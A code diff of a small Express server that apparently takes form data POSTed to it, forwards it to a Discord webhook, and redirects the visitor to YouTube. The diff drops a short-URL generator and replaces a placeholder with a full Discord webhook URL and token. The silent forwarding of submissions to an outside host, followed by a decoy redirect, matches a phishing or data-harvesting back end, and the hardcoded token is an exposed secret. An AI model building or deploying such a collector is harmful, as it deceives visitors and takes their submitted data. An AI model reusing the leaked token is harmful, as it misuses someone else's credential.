@@ -1,13 +1,12 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
-const short = require('short-uuid');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Replace with your Discord webhook URL
-const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+// Use the provided Discord webhook URL
+const webhookUrl = "https://discord.com/api/webhooks/1269031066073694282/5ipMbzWKgPO7cMd9FM4ouHCp2JJhJyVTYy17daQYisynNImBeUuOM8V_3sFafVZewrFa";
 
 app.use(bodyParser.urlencoded({ extended: true }));
 
@@ -26,11 +25,6 @@ app.post('/', async (req, res) => {
     } catch (error) {
         console.error("Error sending data to Discord:", error);
     }
-
-    // Generate a short URL
-    const shortUrl = short.generate();
-
-    console.log(`Generated short URL: ${shortUrl}`);
 
     // Redirect to YouTube
     res.redirect('https://www.youtube.com');
